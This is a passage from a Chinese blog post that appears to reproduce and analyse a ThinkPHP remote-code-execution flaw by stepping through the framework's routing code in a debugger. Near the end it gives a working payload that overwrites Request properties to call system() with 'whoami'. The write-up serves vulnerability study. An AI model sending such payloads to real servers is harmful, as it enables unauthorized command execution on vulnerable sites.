width=\"1200\"/></p>\n<blockquote>\n<p>将/替换成|，这里的$url为/。所以$url就是|了。然后调用request的method方法。</p>\n</blockquote>\n<p><img alt=\"\" height=\"1068\" src=\"..\\..\\static\\image\\35c305697f344b21ada989aecca29647.png\" width=\"1200\"/></p>\n<p></p>\n<blockquote>\n<p> 这个方法就是从post获取_method这个变量，然后赋值给$this-&gt;method，然后执行$this-&gt;{$this-&gt;method}($_POST);看到这，我的天，这里好像两个都可控。不过$this-&gt;method只能在Request中的方法。最终得到$this-&gt;method为GET。</p>\n</blockquote>\n<p><img alt=\"\" height=\"564\" src=\"..\\..\\static\\image\\4444b1240d4f45f48fdda4790b534d0d.png\" width=\"1200\"/></p>\n<blockquote>\n<p>紧接着是检测域名部署、检测URL绑定，检查域名部署为空，然后检查url绑定直接false了。再将|改回/。</p>\n<p> </p>\n</blockquote>\n<p> <img alt=\"\" height=\"857\" src=\"..\\..\\static\\image\\9c38ddf94ac140669a621fccc6b079ee.png\" width=\"1200\"/></p>\n<p></p>\n<blockquote>\n<p> 然后直接到了检查路由这个地方。</p>\n</blockquote>\n<p></p>\n<p><img alt=\"\" height=\"679\" src=\"..\\..\\static\\image\\1875ce8a653a4871aae3eed096ddb07f.png\" width=\"1200\"/></p>\n<blockquote>\n<p>传入的$rules 为hello=&gt;true,然后item变量就是true，然后调用本身的getRouteExpress方法，传入的参数为hello，我们接着看看这个函数吧。</p>\n<p>里面是判断自身的domainRule是不是true，为true的话就是返回self::$domainRule['*']['hello']，这个变量，否则返回self::$rules['*']['hello']这个变量。</p>\n<p>接着分析吧，然后接着就将里面的数据赋值出来。</p>\n</blockquote>\n<p><img alt=\"\" height=\"570\" src=\"..\\..\\static\\image\\8d7209a2a14545d78ba4975bcc9ec839.png\" width=\"1200\"/></p>\n<p><img alt=\"\" height=\"221\" src=\"..\\..\\static\\image\\51af1553bf134cda87418f245a616b8c.png\" width=\"1199\"/></p>\n<blockquote>\n<p>然后是检查参数有效性，进入函数分析。</p>\n<p>里面是判断参数是不是存在，都存在的话就return true，只要有一个不存在就是返回false</p>\n<p>不过里面是contine；所以这里一点都不影响好吧。</p>\n<p>判断系统配置的伪静态后缀参数，让后将后缀去掉。</p>\n<p></p>\n<p> </p>\n</blockquote>\n<p><img alt=\"\" height=\"739\" src=\"..\\..\\static\\image\\b203b2f1eabd4b9b88fa07e168b6f35d.png\" width=\"1200\"/></p>\n<p><img alt=\"\" height=\"722\" src=\"..\\..\\static\\image\\092565beb03948169ee5c310da27fc12.png\" width=\"1200\"/></p>\n<p></p>\n<blockquote>\n<p> 继续向下看，判断rule是不是数组，debug过后是数组的，先将&lt;替换成:，然后取:的个数。我们看看$key是什么。他是hello。如果存在:就截取，不存在就直接赋值。</p>\n<p>判断str变量是不是字符串，将url变量的/替换为|，然后这里就这一行代码有用，继续下面。</p>\n<p>继续检查路由，类似于递归吧，然后如果结果为true就退出递归。</p>\n<p> </p>\n</blockquote>\n<p><img alt=\"\" height=\"594\" src=\"..\\..\\static\\image\\778a70d5ac44448eb0cda630538104a9.png\" width=\"1200\"/></p>\n<blockquote>\n<p>分析一下else if，，如果route存在，就把$item赋值给${$var}，如果group存在就将group连接后面的$rule、然后判断bind_model是不是存在。接着里面也是递归。</p>\n</blockquote>\n<p> </p>\n<p><img alt=\"\" height=\"561\" src=\"..\\..\\static\\image\\374642687a6d4c9cb2b676ac5adb25cf.png\" width=\"1200\"/></p>\n<p></p>\n<blockquote>\n<p> 如果auto变量存在，就调用parseUrl方法。看看这个方法吧。</p>\n</blockquote>\n<p><img alt=\"\" height=\"500\" src=\"..\\..\\static\\image\\c8f2ed2a824942a38b55ccdf7c2ef1c0.png\" width=\"1161\"/></p>\n<p></p>\n<blockquote>\n<p>存在module参数的话，就将其/替换成/，然后赋值给$bind。 这里调试了一下，不会到这，我就先不分析了。继续看下面。</p>\n</blockquote>\n<p><img alt=\"\" height=\"717\" src=\"..\\..\\static\\image\\570470bd3e274660bd86877c4231c384.png\" width=\"1200\"/></p>\n<p></p>\n<blockquote>\n<p> $result是false，$must是false，所以那个if就不进去了，后面是进的，调用那个方法，我靠，还是逃不掉。</p>\n</blockquote>\n<p><img alt=\"\" height=\"672\" src=\"..\\..\\static\\image\\8500c0c9ad4d489a9b7955916a99b3a6.png\" width=\"1200\"/></p>\n<blockquote>\n<p>第一个if直接跳过了，url本来是/的，然后替换成了|，来了一个parseUrlPath函数，看看里面是什么。</p>\n<p> 第一行又改成/了，晕乎乎，然后去空，直接到$path=[$url],return一个数组，第一个是空， 第二个也是空。</p>\n<p>route是一个数组，里面三个空，然后判断path存不存在。path存在，不过为空，module也为空，因为我访问的时候啥也没有所以是空，当我访问index.php/index/index/index的时候，module就是index了。然后$controller也是index，$action也是，然后将模块控制器动作写入route这个变量中， 然后我直接到最后面返回，返回了一个数组，里面是type和module，module是route里面包含模块，控制器，动作。然后再return 一个result，所以$dispatch这个变量就是返回的结果。</p>\n</blockquote>\n<p><img alt=\"\" height=\"667\" src=\"..\\..\\static\\image\\3ac1b3cd7ec14f5fb89fcc228d68ae0c.png\" width=\"1200\"/></p>\n<p><img alt=\"\" height=\"629\" src=\"..\\..\\static\\image\\01eefc3dec76420f884b1725ff7d7708.png\" width=\"1200\"/></p>\n<p><img alt=\"\" height=\"806\" src=\"..\\..\\static\\image\\3c7c88256708446b9d873484bd1fd1c5.png\" width=\"1200\"/></p>\n<p><img alt=\"\" height=\"585\" src=\"..\\..\\static\\image\\c7fbaa3d98734894a6be90a2cd705210.png\" width=\"1200\"/></p>\n<blockquote>\n<p></p>\n<p> 记录当前调度信息，里面就是赋值，将App的$dispatch赋值给request类的dispatch变量，</p>\n<p>然后记录路由和请求信息，这个就不看了。接着就是监听app_degin了，之前也有一个差不多的。然后判断$dispatch里面的type，然后是module。</p>\n<p>里面我们 先不看了，看第二张图，清空类的实例化，将self::$instance清空，然后输出数据到客户端，data是html代码。然后进行处理，最后监听app_end，return了response，也就是run方法最终返回的是response类，那个再调用里面的send发送给客户端，客户端收到html代码。大致明白了流程。其中还有很多函数我没调试的。</p>\n</blockquote>\n<p><img alt=\"\" height=\"698\" src=\"..\\..\\static\\image\\99ab2f077a8c49cb820202d38a316cee.png\" width=\"1200\"/></p>\n<p><img alt=\"\" height=\"652\" src=\"..\\..\\static\\image\\cb5d2976c6d14948ab207da9462256a4.png\" width=\"1200\"/></p>\n<blockquote>\n<p>接着我们分析之前我们找到的利用点吧。</p>\n<p>之前分析了我们可以调用request里面的所有方法，我们注意到__construct方法。</p>\n<p>里面传入的值是POST，我们可控，然后里面是有一个$this-&gt;$name=$item，就是把传入的值判断是不是自己得属性，然后赋值给他，也就是说，我们可以对任意的 自己的属性赋值，我们先看看返回什么。</p>\n<p> </p>\n</blockquote>\n<p><img alt=\"\" height=\"754\" src=\"..\\..\\static\\image\\a48bee8769b4437fa4d0802d9b734184.png\" width=\"1200\"/></p>\n<p><img alt=\"\" height=\"607\" src=\"..\\..\\static\\image\\9b859af49a7c4f85886cd49d67fa1238.png\" width=\"1200\"/></p>\n<p></p>\n<blockquote>\n<p> 他return的是method，我们就将这个改一下。也就是构造_method=__construct&amp;method=[一个值]，那么我们就可以构造method了，再继续往下分析。</p>\n</blockquote>\n<p><img alt=\"\" height=\"306\" src=\"..\\..\\static\\image\\b4abdb6188af42febe6181c875032627.png\" width=\"1052\"/></p>\n<blockquote>\n<p>可以看到他找自己的rules中的method这个参数，如果不存在的话，就报错。那么我们看一下里面有些什么。那我们随便赋值一个东西，例如POST。然后接着一行一行代码往下调试。</p>\n</blockquote>\n<p> </p>\n<p><img alt=\"\" height=\"363\" src=\"..\\..\\static\\image\\8a87fe0bc06a498e82635ad025600193.png\" width=\"820\"/></p>\n<p><img alt=\"\" height=\"541\" src=\"..\\..\\static\\image\\52eb0af402a340ca9712f334bcadf3d2.png\" width=\"1190\"/></p>\n<blockquote>\n<p>存在一个filterValue的方法，然后里面会进行一个循环执行命令，这个filter是传入的值，</p>\n<p>看到是$this-&gt;filter，我们记得我们可以控制request类中的任意变量，然后再在post里面加入filter[]=system。接着这个value是什么，是传入的值，那我们随便构造一个参数例如a=whoami就好了那最终的payload就是</p>\n<p></p>\n<p> _method=__construct&amp;method=POST&amp;filter[]=system&amp;a=whoami</p>\n<p>我们来试试。</p>\n</blockquote>\n<p><img alt=\"\" height=\"530\" src=\"..\\..\\static\\image\\cdbfa9f9081e44429cf5129300290f89.png\" width=\"1200\"/></p>\n<p><img alt=\"\" height=\"482\" src=\"..\\..\\static\\image\\cd59032bf533427998551ba929016f55.png\" width=\"1200\"/></p>\n<blockquote>\n<p>最终我们就分析成功了，一个变量覆盖导致的rce。</p>\n</blockquote>\n<p><img alt=\"\" height=\"1158\" src=\"..\\..\\static\\image\\a61010cd99d44951b118e2b59b06b75e.png\" width=\"1200\"/></p>\n<h2>四、总结</h2>\n<blockquote>\n<p>这一整个系统代码分析持续了很久，以为一天可以搞定的，因为一些事情耽误了，最终还是分析出来了，里面的分析挺乱的，还有很多函数没有分析，自己也没有那么多耐心了，算是知道这个版本有漏洞然后来找这个漏洞，属于是零基础分析了吧。</p>\n<p>分析完这个thinkphp的运行原理，只能说简单的分析了，然后后面肯定会轻松一点的，加油加油。</p>\n</blockquote>\n</div>\n</div>", "first_tag": "PHP", "cpp": 0, "csharp": 0, "python": 0, "javascript": 0, "java": 0, "sql": 0, "php": 1, "time": "2022-07-06 15:58:02", "summary": "菜鸟来复现一下的，如果有什么分析的不对的地方欢迎指正。一环境搭建二、漏洞复现三、漏洞分析这里将从最开始分析如何的。之前这个漏洞没分析过。使用进行调试从开始首先定义这个常量为，就是定义的路径位置。然后包"}